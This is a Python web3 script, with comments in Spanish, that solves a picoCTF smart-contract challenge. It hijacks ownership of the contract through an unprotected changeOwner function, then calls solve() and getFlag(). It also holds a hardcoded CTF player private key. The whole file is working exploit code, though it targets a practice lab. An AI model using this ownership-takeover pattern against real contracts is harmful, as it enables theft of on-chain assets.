from web3 import Web3

# 1. Conexión al nodo de la blockchain de picoCTF
rpc_url = "http://lonely-island.picoctf.net:59013"
w3 = Web3(Web3.HTTPProvider(rpc_url))

if not w3.is_connected():
    print("[-] Error: No se pudo conectar al nodo de la blockchain.")
    exit()
    
print("[+] Conectado a la blockchain exitosamente.")

# 2. Credenciales del jugador (Tus datos) con Checksum Automático
private_key = "0xa1ac2450cd42396d92081a406d5c75fcc0392524e7466d51f13e0c71d0f910cb"
my_address = Web3.to_checksum_address("0xB0f3aD837a6bF1b81CC14A153a3ED4748E584dFF")
contract_address = Web3.to_checksum_address("0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9")

# 3. El ABI (Application Binary Interface)
# Es el "mapa" para que Python sepa cómo se llaman las funciones del contrato
abi = [
    {"inputs":[{"internalType":"address","name":"_newOwner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}
]

contract = w3.eth.contract(address=contract_address, abi=abi)
chain_id = w3.eth.chain_id

# Función de ayuda para firmar y enviar transacciones
def send_transaction(tx_build, step_name):
    print(f"[*] Ejecutando: {step_name}...")
    # Agregamos el nonce (número de transacción de nuestra cuenta)
    tx_build['nonce'] = w3.eth.get_transaction_count(my_address)
    
    # Firmamos con nuestra clave privada
    signed_tx = w3.eth.account.sign_transaction(tx_build, private_key)
    
    # Enviamos la transacción a la red
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"    -> Transacción enviada. Hash: {tx_hash.hex()}")
    
    # Esperamos a que el bloque se mine
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"    -> ¡Minada en el bloque {receipt.blockNumber}!\n")

# --- COMIENZA EL ATAQUE ---

# A. Secuestrar el contrato (Aprovechamos la falta de validación)
tx_hijack = contract.functions.changeOwner(my_address).build_transaction({
    'from': my_address,
    'chainId': chain_id,
    'gasPrice': w3.to_wei('1', 'gwei')
})
send_transaction(tx_hijack, "Secuestrar Contrato (changeOwner)")

# B. Llamar a solve() ahora que somos los dueños
tx_solve = contract.functions.solve().build_transaction({
    'from': my_address,
    'chainId': chain_id,
    'gasPrice': w3.to_wei('1', 'gwei')
})
send_transaction(tx_solve, "Desbloquear Bandera (solve)")

# C. Leer la bandera (Es una función 'view', no cuesta gas ni requiere firmar)
print("[*] Recuperando la bandera...")
flag = contract.functions.getFlag().call()
print(f"\n[+] ¡OBJETIVO COMPROMETIDO! Bandera obtenida: {flag}")